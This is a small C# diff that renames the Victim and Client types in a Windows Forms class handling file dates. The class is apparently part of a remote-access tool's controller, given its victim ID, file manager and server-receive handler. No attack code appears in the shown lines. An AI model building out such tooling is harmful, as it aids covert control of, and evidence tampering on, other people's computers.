@@ -12,10 +12,10 @@ namespace Eden
 {
     public partial class frmFileDatetime : Form
     {
-        private Victim m_victim { get; set; }
+        private clsVictim m_victim { get; set; }
         private frmFileMgr.stEntryTag m_entry { get; set; }
 
-        public frmFileDatetime(Victim victim, frmFileMgr.stEntryTag entry)
+        public frmFileDatetime(clsVictim victim, frmFileMgr.stEntryTag entry)
         {
             InitializeComponent();
 
@@ -23,7 +23,7 @@ namespace Eden
             m_entry = entry;
         }
 
-        private void fnServRecv(Client clnt, string szVictimID, string[] asMsg)
+        private void fnServRecv(clsClient clnt, string szVictimID, string[] asMsg)
         {
             try
             {
